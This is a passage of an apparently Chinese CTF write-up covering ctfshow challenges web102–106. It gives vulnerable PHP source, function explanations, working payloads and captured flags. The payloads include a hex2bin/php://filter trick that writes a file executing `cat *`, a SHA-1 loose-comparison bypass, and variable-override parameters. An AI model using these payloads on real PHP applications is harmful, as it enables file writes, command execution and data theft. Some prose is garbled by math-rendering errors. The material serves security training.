<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'hacker'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v1 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">14</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v2 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">15</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v3 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">16</span></span>
<span class="line"><span style="color:#d4d4d4">hacker</span></span></code></pre></div></div></figure><p>这里注意几个函数：<br>substr () 函数返回一部分字符串</p><p>定义：substr (string, start, length)</p><table><thead><tr><th><em>string</em></th><th>必需。规定要返回其中一部分的字符串。</th></tr></thead><tbody><tr><td><em>start</em></td><td>必需。规定在字符串的何处开始。 正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始 0 - 在字符串中的第一个字符处开始</td></tr><tr><td><em>length</em></td><td>可选。规定被返回字符串的长度。默认是直到字符串的结尾。 正数 - 从 <em>start</em> 参数所在的位置返回的长度 负数 - 从字符串末端返回的长度</td></tr></tbody></table><p>call_user_func () 会把第一个参数作为回调函数调用，具体实例可以参考这篇文章 call_user_func () <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">使用方法</a></p><p>进行代码审计</p><p>1.if(<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;要&quot; used in math mode [unicodeTextInMathMode] at position 4: v4)要̲成立肯定需要">v4) 要成立肯定需要</span> v2 为数字，而且从第三位开始应该要构造一个能拿到 flag 的语句，因为是数字，那可以尝试字符串转数字（&lt;?=<code>cat *</code>;），而转为数字之后又要让 call_user_func 在这个调用时能够被识别，可以想到用 base64decode，即 php://filter 伪协议。</p><p>2.<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;被&quot; used in math mode [unicodeTextInMathMode] at position 2: s被̲赋值">s 被赋值</span> v2 的第三个字符后 (包括第三个字符) 的所有字符</p><p>3.call_user_func 会调用<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;类&quot; used in math mode [unicodeTextInMathMode] at position 3: v1类̲中的"> v1 类中的</span> s 方法或者调用方法<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;而&quot; used in math mode [unicodeTextInMathMode] at position 3: v1而̲"> v1 而</span> s 作为方法中的变量进行调用</p><p>4.$str 会被打印输出，我们可以通过这个进行检查</p><p>5.file_put_contents 将会以<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;作&quot; used in math mode [unicodeTextInMathMode] at position 3: v3作̲为文件名写入"> v3 作为文件名写入</span> str</p><p>构造 payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">v2构造要先构造&lt;?=</span><span style="color:#ce9178">`cat *`</span><span style="color:#d4d4d4">的base64结果：</span></span>
<span class="line"><span style="color:#d4d4d4">	&lt;?=</span><span style="color:#ce9178">`cat *`</span><span style="color:#d4d4d4">  -&gt;	</span><span style="color:#9cdcfe">PD89YGNhdCAqYDs</span><span style="color:#d4d4d4">=</span></span>
<span class="line"><span style="color:#d4d4d4">之后base64要转为数字：</span></span>
<span class="line"><span style="color:#d4d4d4">	PD89YGNhdCAqYDs=  -&gt;  </span><span style="color:#b5cea8">5044383959474e68644341715944733</span><span style="color:#d4d4d4">d</span></span>
<span class="line"><span style="color:#d4d4d4">上传之后发现过不了，仔细审查发现这里转数字之后除了e之外还有d，导致不能识别为数字，由于base64里等号是用来补齐的，没有实际意义，删除等号之后再构建：</span></span>
<span class="line"><span style="color:#d4d4d4">    PD89YGNhdCAqYDs  -&gt;  </span><span style="color:#b5cea8">5044383959474e6864434171594473</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span></span>
<span class="line"><span style="color:#d4d4d4">则构造如下：</span></span>
<span class="line"><span style="color:#d4d4d4">get:        </span></span>
<span class="line"><span style="color:#d4d4d4">	v2=</span><span style="color:#b5cea8">115044383959474e6864434171594473</span></span>
<span class="line"><span style="color:#d4d4d4">	v3=php:</span><span style="color:#6a9955">//filter/write=convert.base64-decode/resource=1.php</span></span>
<span class="line"><span style="color:#d4d4d4">post:</span></span>
<span class="line"><span style="color:#d4d4d4">	v1=hex2bin</span></span></code></pre></div></div></figure><p>hex2bin () 定义和用法</p><p>hex2bin () 函数把十六进制值的字符串转换为 ASCII 字符。</p><p>语法</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">hex2bin</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">必需。要转换的十六进制值。</td></tr></tbody></table><p>技术细节</p><table><thead><tr><th>返回值：</th><th>返回被转换字符串的 ASCII 字符，如果失败则返回 FALSE。</th></tr></thead><tbody><tr><td>PHP 版本：</td><td>5.4.0+</td></tr><tr><td>更新日志：</td><td>自 PHP 5.4.1 起，如果字符串长度为奇数，则抛出一个警告。在 PHP 5.4.0 中，奇数字符串被默默接受，但是最后一个字节会被移除。自 PHP 5.5.1 起，如果字符串是无效的十六进制字符串，则抛出一个警告。</td></tr></tbody></table><p>其实这里 v1 转出 ascii 码之后也就是我们的 base64：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php </span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#9cdcfe">$hex</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">hex2bin</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"5044383959474e6864434171594473"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#dcdcaa">var_dump</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$hex</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#6a9955">// string(15) "PD89YGNhdCAqYDs"</span></span>
<span class="line"><span style="color:#6a9955">// 进程已结束,退出代码0</span></span></code></pre></div></div></figure><p>按上面的构造传参之后访问 1.php 查看源代码即可拿到 flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">d21a5ac-c888-</span><span style="color:#b5cea8">491e-9998</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">781e056</span><span style="color:#d4d4d4">ea179}</span></span></code></pre></div></div></figure><h3 id="web103call_user_func理解hex2bin利用"><a class="markdownIt-Anchor" href="#web103call_user_func理解hex2bin利用"></a> web103	(call_user_func 理解 + hex2bin 利用)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: atao</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$v4</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">) and </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v4</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$s</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$s</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/.</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">p.</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">h.</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">p.</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">/i"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'Sorry'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'hacker'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v1 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">14</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v2 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">15</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: v3 in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">16</span></span>
<span class="line"><span style="color:#d4d4d4">hacker</span></span></code></pre></div></div></figure><p>这道题比上道题多了对 $str 的过滤，匹配了 php，这并不阻碍我们进行 cat。</p><p>解题步骤同上题（参数都不用改的那种）。</p><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">93</span><span style="color:#d4d4d4">ead8b1-f51c-</span><span style="color:#b5cea8">4e9</span><span style="color:#d4d4d4">e-</span><span style="color:#b5cea8">8e62</span><span style="color:#d4d4d4">-edc121bf108e}</span></span></code></pre></div></div></figure><h3 id="web104sha1加密理解"><a class="markdownIt-Anchor" href="#web104sha1加密理解"></a> web104	(sha1 加密理解)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: atao</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">)==</span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里的 sha1 () 函数是计算字符串的 SHA-1 散列，默认是输出 40 字符十六进制数</p><p><strong>语法</strong></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">,raw)</span></span></code></pre></div></div></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">必需。规定要计算的字符串。</td></tr><tr><td style="text-align:left"><em>raw</em></td><td style="text-align:left">可选。规定十六进制或二进制输出格式：TRUE - 原始 20 字符二进制格式 FALSE - 默认。40 字符十六进制数</td></tr></tbody></table><p><strong>技术细节</strong></p><table><thead><tr><th>返回值：</th><th>如果成功则返回已计算的 SHA-1 散列，如果失败则返回 FALSE。</th></tr></thead><tbody><tr><td>PHP 版本：</td><td>4.3.0+</td></tr><tr><td>更新日志：</td><td>在 PHP 5.0 中，<em>raw</em> 参数变成可选的。</td></tr></tbody></table><p>SHA-1 的绕过可以看这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/king-kb/p/15531476.html">https://www.cnblogs.com/king-kb/p/15531476.html</a></p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">get:v2=aaroZmOk</span></span>
<span class="line"><span style="color:#d4d4d4">post:v1=aaK1STfY</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153507.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221116185638419"></p><p>flag:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{bb9152f0-</span><span style="color:#b5cea8">595</span><span style="color:#d4d4d4">d-</span><span style="color:#b5cea8">4e28</span><span style="color:#d4d4d4">-a69f-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">b475604481d}</span></span></code></pre></div></div></figure><h3 id="web105变量覆盖"><a class="markdownIt-Anchor" href="#web105变量覆盖"></a> web105	(变量覆盖)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'flag.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$error</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'你还想要flag嘛？'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$suces</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'既然你想要那给你吧！'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">'error'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"what are you doing?!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$$key</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$$value</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"what are you doing?!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$$key</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$$value</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">]==</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$error</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"your are good"</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$suces</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">你还想要flag嘛？</span></span></code></pre></div></div></figure><p>这道题利用的是变量覆盖，可参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41381461/article/details/90047616">PHP 变量覆盖</a></p><p>看懂变量覆盖原理之后的复盘：</p><p>题目首先定义并初始化两个变量，并且在 foreach 中也写出了 $$ 很明显就是变量覆盖了。怎么覆盖呢？第一个 foreach 循环将 get 传参赋给 $$key 且这里 value 也是双 $$，可以构造两个变量覆盖。然后再找打印输出的，发现 post 不匹配 flag 内容（怎么可能会匹配）就会 die 输出 $error，那么怎么连起来 error 和 suces？发现 post 传参中也有变量覆盖可以利用。到这里思路清晰了：</p><p>1. 将 suces 覆盖赋值为 flag 的值</p><p>2. 将 error 覆盖赋值为 suces</p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">get：?suces=flag</span></span>
<span class="line"><span style="color:#d4d4d4">post：error=suces</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153626.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221116195559102"></p><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{abe208aa-</span><span style="color:#b5cea8">64</span><span style="color:#d4d4d4">d4-</span><span style="color:#b5cea8">47</span><span style="color:#d4d4d4">be-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">dd3-d866cbbc67f9}</span></span></code></pre></div></div></figure><h3 id="web106sha1理解"><a class="markdownIt-Anchor" href="#web106sha1理解"></a> web106	(sha1 理解)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: atao</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
